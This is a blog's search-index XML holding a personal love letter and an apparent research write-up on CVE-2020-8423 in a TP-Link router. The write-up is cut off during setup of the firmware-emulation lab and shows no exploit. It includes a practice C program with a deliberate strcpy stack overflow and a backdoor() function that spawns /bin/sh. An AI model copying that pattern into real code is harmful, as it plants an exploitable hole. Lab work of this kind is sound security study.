<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>我想对她说</title>
      <link href="//posts/c65cfae6/"/>
      <url>//posts/c65cfae6/</url>
      
        <content type="html"><![CDATA[<p>我想，或许再多的道歉也抚伤不了我对你的伤害。<br>真的非常对不起你，辜负了你太多太多。<br>我们刚认识的时候，还每天聊的很开心，但是突然间发生了那样的事，我开始封闭我自己，隔离这个世界，其实我也不只第一次这样，也许是我经历了太多习得性无助，习惯了一个人，对你的鼓励已经看淡，渐渐地，后面开始冷落你，不理你，只专注于自己的压抑上，可你还每天陪伴我，安慰我鼓励我，给我传递好情绪，而我却一次次给你泼了冷水，伤透了你的心。不经意间，我开始有意无意地把自己的消极厌世的情绪传给你，以往我的这些想法只会自己憋在心里，从不向别人提及，但是不知道为什么会向你说这么多，也没考虑过会对你的感受，我好笨，明明可以向往常一样憋着就行了，非要说出来，让你一点好情绪都没了，这样消极悲观的心态和你想要的积极阳光的一面也截然相反。<br>你当然没有做错什么，你只是想帮助我摆脱困境，每天把自己最阳光的情绪传递给我，让我重新站起来，做错的是我，每次和你说些消极的话，还把你的好情绪给冲散了，最后还发神经说那样的话，明明是我需要你才对。我在压抑中迷失了自我，最后从时间中走出来，也忘了给你传递好情绪，是我的错。<br>我是个坏人，一次次拒绝你，让你从一次次失望中难过；我是个笨蛋，一次次冷落你，让你内耗不安；我是个傻瓜，一次次说那种丧气的话，传递消极的情绪给你。浪费了你很多时间和精力，我想，再多的道歉也抚伤不了我对你的伤害了。<br>你是一个好女孩，由衷感谢你，在我最困难的时期，是你一直陪伴鼓舞着我，前些天考完的时候，好想和你聊天，回到当初刚和你认识的样子，但是已经晚了。非常对不起你，但是说对不起已经没什么用了，我已经深深地伤了你的心，早已把你的耐心消耗殆尽。周末知道你要出去玩，所以一直不敢回你。你也已经找到了自己的生活方式，或许你也已经不喜欢我，我知道，再怎么样也不能取得你的原谅，但我觉得我非常愧对于你，还是想给你做点什么。如果未来某一天你一个人觉得难过或无聊了想来河西小酒馆喝点小酒，不介意的话，我可以陪你畅饮到天亮。如果可以，我愿意一直展示自己最积极阳光的一面给你，愿意一直陪伴守护着你。我会一直等着你。</p><p>最后，我还想补上我一直没说出口的一句话：<strong>伍雨欢，我爱你。</strong></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/qq_pic_merged_1751389425494.jpg" alt="qq_pic_merged_1751389425494"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -我想对她说 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-8423</title>
      <link href="//posts/24932e9/"/>
      <url>//posts/24932e9/</url>
      
        <content type="html"><![CDATA[<p> 漏洞编号：CVE-2020-8423</p><p>固件地址： <a href="https://www.tp-link.com/no/support/download/tl-wr841n/v10/">https://www.tp-link.com/no/support/download/tl-wr841n/v10/</a></p><p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20241127164755571.png" alt="image-20241127164755571"></p><h5 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h5><p>安装binwalk</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install binwalk</span><br></pre></td></tr></tbody></table></figure><p>SquashFS:用于Linux内核的只读文件系统</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">sudo git clone https://github.com/devttys0/sasquatch  </span><br><span class="line"><span class="comment"># 没有代理的话  git clone https://gitee.com/yixuan1/sasquatch.git </span></span><br><span class="line">cd sasquatch &amp;&amp; sudo ./build.sh</span><br></pre></td></tr></tbody></table></figure><p>qemu安装</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></tbody></table></figure><p>交叉编译环境buildroot</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev patch</span><br><span class="line">wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2</span><br><span class="line">tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">cd buildroot/</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br><span class="line">sudo make</span><br></pre></td></tr></tbody></table></figure><p>进入menuconfig后，选择目标架构Mips32</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127183404405.png" alt="image-20241127183404405"></p><p>安装完后设置环境变量，再/etc/profile结尾加上</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:$HOME/buildroot/output/host/<span class="built_in">bin</span></span><br></pre></td></tr></tbody></table></figure><p>编译第一个mips程序</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>{</span><br><span class="line">     system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">has_stack</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">{</span><br><span class="line">     <span class="type">char</span> dst[<span class="number">20</span>]={<span class="number">0</span>};</span><br><span class="line">     <span class="built_in">strcpy</span>(dst,src);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"copy successfully"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">     has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>默认编译小端序程序，注意要加<strong>-static</strong> 静态编译，因为qemu运行环境里没包含c标准库</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc vuln.c -o vuln -static</span><br><span class="line">file vuln</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127220720093.png" alt="image-20241127220720093"></p><p>编译大端程序，需要加-EB参数,但是仅仅加-EB会导致ld报错，所以要编译和链接分开</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc -EB -c -static  vuln.c -o vuln.o </span><br><span class="line">mipsel-linux-ld vuln.o -EB -o vuln</span><br></pre></td></tr></tbody></table></figure><p>但我还是报错了</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hpp@swikar:~$ mipsel-linux-gcc -EB -c -static  vuln.c -o vuln.o </span><br><span class="line">hpp@swikar:~$ mipsel-linux-ld vuln.o -EB -o vuln</span><br><span class="line">mipsel-linux-ld: warning: cannot find entry symbol __start; defaulting to 00400110</span><br><span class="line">mipsel-linux-ld: vuln.o: <span class="keyword">in</span> function `backdoo<span class="string">r':</span></span><br><span class="line"><span class="string">vuln.c:(.text+0x24): undefined reference to `system'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0x2c</span>): undefined reference to `system<span class="string">'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.o: in function `has_stack'</span>:</span><br><span class="line">vuln.c:(.text+<span class="number">0x74</span>): undefined reference to `__stack_chk_guard<span class="string">'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.c:(.text+0xa0): undefined reference to `strcpy'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0xa8</span>): undefined reference to `strcpy<span class="string">'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.c:(.text+0xbc): undefined reference to `printf'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0xc4</span>): undefined reference to `<span class="built_in">print</span><span class="string">f'</span></span><br><span class="line"><span class="string">mipsel-linux-ld: vuln.c:(.text+0xd4): undefined reference to `__stack_chk_guard'</span></span><br><span class="line">mipsel-linux-ld: vuln.c:(.text+<span class="number">0xe8</span>): undefined reference to `__stack_chk_fail<span class="string">'</span></span><br></pre></td></tr></tbody></table></figure><p>用工具链安装mips编译环境</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross</span><br><span class="line">sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross</span><br><span class="line">sudo apt-get install binutils-mipsel-linux-gnu</span><br><span class="line"><span class="comment">#我这里用的是版本是10，mipsel-linux-gnu-gcc和mips-linux-gnu-gcc分别是是下面两个包的一部分</span></span><br><span class="line">sudo apt-get install gcc-${VERSION}-mipsel-linux-gnu g++-${VERSION}-mips-linux-gnu </span><br></pre></td></tr></tbody></table></figure><p>mipsel-linux-gnu-gcc说找不到，需要创建符号链接</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/<span class="built_in">bin</span>/mipsel-linux-gnu-gcc-<span class="number">10</span> /usr/<span class="built_in">bin</span>/mipsel-linux-gnu-gcc</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241128001006442.png" alt="image-20241128001006442"></p><p>用mips-linux-gnu-gcc编译大端序</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mips-linux-gnu-gcc vuln.c -o vuln -static</span><br><span class="line">$ file vuln</span><br><span class="line">vuln: ELF <span class="number">32</span>-bit MSB executable, MIPS, MIPS32 rel2 version <span class="number">1</span> (SYSV), statically linked, BuildID[sha1]=5608d962ff3f4b40b36c9d67a82dfa1f4275ad07, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br></pre></td></tr></tbody></table></figure><p>安装qemu-user</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt install qemu-user</span><br><span class="line">$qemu-mipsel vuln <span class="string">"123"</span></span><br><span class="line">copy successfully</span><br></pre></td></tr></tbody></table></figure><p>qemu运行Mips Linux内核</p><p><a href="https://people.debian.org/~aurel32/qemu/mips/在这里下载包">https://people.debian.org/~aurel32/qemu/mips/在这里下载包</a></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-<span class="number">3.2</span><span class="number">.0</span>-<span class="number">4</span>-4kc-malta</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br></pre></td></tr></tbody></table></figure><p>用qemu运行mips debian,账号密码都是root</p><p>qemu有主要如下两种运作模式，User Mode和System Mode</p><p>安装qemu-system-mips</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install qemu-system-mips</span><br></pre></td></tr></tbody></table></figure><p>qemu的几个系统命令</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/t012dd195f031df4f23.png" alt="img"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel $HOME/vmlinux-<span class="number">3.2</span><span class="number">.0</span>-<span class="number">4</span>-4kc-malta -hda $HOME/debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sdal console=tty0"</span> -net nic,macaddr=<span class="number">00</span>:0c:<span class="number">29</span>:ee:<span class="number">39</span>:<span class="number">39</span> -net tap -nographic</span><br></pre></td></tr></tbody></table></figure><p>登录成功</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241128003759344.png" alt="image-20241128003759344"></p><p>安装<strong>Gdb-Multiarch</strong>，能够调试多个架构（包括mips）的gdb调试工具</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb-multiarch</span><br></pre></td></tr></tbody></table></figure><p>安装peda插件</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></tbody></table></figure><p>把 <strong>vim ~/.gdbinit</strong> 改为pwndbg的</p><p>gdbserver(mips)</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rapid7/embedded-tools.git</span><br><span class="line">git clone https://github.com/hugsy/gdb-static</span><br><span class="line">git cloen https://github.com/akpotter/embedded-toolkit</span><br></pre></td></tr></tbody></table></figure><p>测试</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mipsel-linux-gnu-gcc vuln.c -o vuln -static</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-mipsel -g 9000 vuln</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">file vuln</span></span><br><span class="line">Reading symbols from vuln...</span><br><span class="line">(No debugging symbols found in vuln)</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:9000</span></span><br><span class="line">Remote debugging using 127.0.0.1:9000</span><br></pre></td></tr></tbody></table></figure><p>成功</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241128171738997.png" alt="image-20241128171738997"></p><p><strong>ROPgadget</strong> 源码安装</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git &amp;&amp; cd ROPgadget</span><br><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo -H python3 -m pip install capstone</span><br><span class="line">sudo -H python3 setup.py install</span><br></pre></td></tr></tbody></table></figure><p>安装wireshark</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:wireshark-dev/stable</span><br><span class="line">sudo apt install -y wireshark</span><br><span class="line">sudo usermod -aG wireshark $USER</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>安装Mipsrop</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tacnetsol/ida/blob/master/plugins/mipsrop/mipsrop.py</span><br><span class="line">https://github.com/SeHwa/mipsrop-<span class="keyword">for</span>-ida7</span><br></pre></td></tr></tbody></table></figure><h5 id="配置运行环境"><a href="#配置运行环境" class="headerlink" title="配置运行环境"></a><strong>配置运行环境</strong></h5><p>用qemu来模拟路由器</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me TL-WR841N_V10_150310.<span class="built_in">zip</span></span><br><span class="line">cd _TL-WR841N_V10_150310.<span class="built_in">zip</span>.extracted/_wr841nv10_wr841ndv10_en_3_16_9_up_boot\(<span class="number">150310</span>\).<span class="built_in">bin</span>.extracted/squashfs-root/</span><br></pre></td></tr></tbody></table></figure><p>安装gdb7</p><p>注释掉这几个文件的这个函数</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241210194031559.png" alt="image-20241210194031559"></p><p><strong>配置桥接</strong></p><p> <strong>这里本人遇到了很多坑 ：（</strong></p><p>将文件系统传入虚拟机中运行固件，为了能让qemu和虚拟机传输文件，先配置桥接网络</p><p><strong>1.配置桥接网卡</strong></p><p>安装bridge-utils和uml-utilities</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get  install bridge-utils</span><br><span class="line">sudo apt-get install uml-utilities</span><br></pre></td></tr></tbody></table></figure><p>修改 <strong>/etc/network/interfacces</strong> 来配置网络桥接</p><p>以下是旧版本适用</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nano /etc/network/interfaces</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Loopback interface ,设置回环接口</span></span><br><span class="line">auto lo                    </span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eth0 interface ，设置eth0接口为手动配置模式</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line"><span class="comment"># 将eth0接口的ip地址设置为 0.0.0.0，并启用该接口</span></span><br><span class="line">up ifconfig eth0 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> up</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bridge interface </span></span><br><span class="line">auto br0        <span class="comment">#表示将 eth0 端口加入到桥接接口 br0 中</span></span><br><span class="line">iface br0 inet dhcp  </span><br><span class="line">bridge_ports eth0</span><br><span class="line">bridge_stp off  <span class="comment">#禁用生成树协议 (STP)，可以减少一些延迟</span></span><br><span class="line">bridge_maxwait <span class="number">1</span>  <span class="comment">#设置桥接的最大等待时间为 1 秒</span></span><br></pre></td></tr></tbody></table></figure><p>我的试了不行，我用的是Ubuntu22，好像因为高版本点的Ubuntu用的是 <strong>etc/netplan</strong> </p><p>注意这里的renderer必须改为networkd，不然会显示没有ens33没有桥接到br0</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129173011654.png" alt="image-20241129173011654"> </p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/netplan/01-network-manager-all.yaml</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Let NetworkManager manage all devices on this system</span></span><br><span class="line">network:</span><br><span class="line">  version: <span class="number">2</span></span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      dhcp4: false  <span class="comment"># 禁用 DHCP，使用静态 IP</span></span><br><span class="line">      optional: true  <span class="comment"># 确保这个接口是可选的</span></span><br><span class="line">  bridges:</span><br><span class="line">    br0:</span><br><span class="line">      interfaces:</span><br><span class="line">        - ens33  <span class="comment"># 将 ens33 添加到桥接接口 br0</span></span><br><span class="line">      dhcp4: true  <span class="comment"># 启用 DHCP 给 br0 分配地址</span></span><br><span class="line">      parameters:</span><br><span class="line">        stp: false  <span class="comment"># 禁用生成树协议</span></span><br><span class="line">        forward-delay: <span class="number">0</span>  <span class="comment"># 设置转发延迟</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></tbody></table></figure><p>配置<strong>qemu-ifup</strong> 脚本</p><p>为了使qemu在启动使自动将网卡（默认使tap0或tap1）加入到桥接网卡中</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nano /etc/qemu-ifup</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">echo <span class="string">"Executing /etc/qemu-ifup"</span>   <span class="comment">#通过 ifconfig 启动传入的接口 $1（例如 tap0）</span></span><br><span class="line">echo <span class="string">"Bringing up $1 for bridged mode..."</span>  <span class="comment">#将接口 $1 添加到桥接接口 br0</span></span><br><span class="line">sudo /sbin/ifconfig $<span class="number">1</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> promisc up  </span><br><span class="line">echo <span class="string">"Adding $1 to br0..."</span></span><br><span class="line">sudo /sbin/brctl addif br0 $<span class="number">1</span></span><br><span class="line"><span class="comment">#sudo ifconfig br0 10.211.55.6/24</span></span><br><span class="line">sleep <span class="number">3</span></span><br></pre></td></tr></tbody></table></figure><p>给脚本执行权限</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /etc/qemu-ifup</span><br></pre></td></tr></tbody></table></figure><p>设置好后，重启开启虚拟机，启动qemu，会多一个br0网卡</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic,macaddr=00:0c:29:ee:39:39 -net tap -nographic</span><br></pre></td></tr></tbody></table></figure><p>br0是虚拟机和qemu的桥接接口，ens33虚拟机的网卡接口，tap0是qemu的网卡接口</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129173451337.png" alt="image-20241129173451337"></p><p>设置ip使其在同一网段</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在虚拟机</span></span><br><span class="line">hpp@swikar:~/桌面$ sudo ifconfig br0 <span class="number">192.168</span><span class="number">.123</span><span class="number">.6</span>/<span class="number">24</span> up</span><br><span class="line"><span class="comment">#在qemu</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.123.7/24 up</span></span><br></pre></td></tr></tbody></table></figure><p>成功ping通</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129174243369.png" alt="image-20241129174243369"></p><p>确保qemu的子网掩码和桥接网卡的一致，不然不能传文件</p><p>这里我遇到了个问题，由于较新的Ubuntu的openSSH客户端禁用了过时的算法（如 <code>ssh-rsa</code> 和 <code>ssh-dss</code>），但qemu的ssh服务用的是较老的密钥算法</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo scp -r squashfs-root/ root@192.168.123.7:~/</span></span><br><span class="line">Unable to negotiate with 192.168.123.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">lost connection</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>我这里直接用命令行改用较老的方式</p><p>这里是将路由器的文件系统传到qemu</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -r squashfs-root/ root@<span class="number">192.168</span><span class="number">.123</span><span class="number">.7</span>:~/</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129181503862.png" alt="image-20241129181503862"></p><p>也可以修改ssh客户端配置</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/ssh/ssh_config</span><br></pre></td></tr></tbody></table></figure><p>添加这些内容</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host <span class="number">192.168</span><span class="number">.123</span>.*</span><br><span class="line">    HostKeyAlgorithms +ssh-rsa</span><br><span class="line">    PubkeyAcceptedKeyTypes +ssh-rsa</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -r squashfs-root/ root@<span class="number">192.168</span><span class="number">.123</span><span class="number">.7</span>:~/</span><br></pre></td></tr></tbody></table></figure><p>Ubuntu会没网，需要修改dns</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/systemd/resolved.conf</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Resolve]</span><br><span class="line">DNS=<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="number">8.8</span><span class="number">.4</span><span class="number">.4</span></span><br><span class="line">FallbackDNS=<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="number">8.8</span><span class="number">.4</span><span class="number">.4</span></span><br></pre></td></tr></tbody></table></figure><p>重启服务</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart systemd-resolved</span><br></pre></td></tr></tbody></table></figure><p>挂载系统的proc到固件目录下的proc,这样我们的程序在访问一些内核信息时能读取到，否则程序运行可能会报错</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂载文件系统</span></span><br><span class="line">root@debian-mips:~# mount --bind /proc squashfs-root/proc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更换root目录</span></span><br><span class="line">root@debian-mips:~/squashfs-root# chroot . bin/sh</span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129182244602.png" alt="image-20241129182244602"></p><p>直接运行会有很多报错，需要hook掉fork和system函数</p><p>在虚拟机编译hook然后传到qemu</p><figure class="highlight c"><table><tbody><tr><td 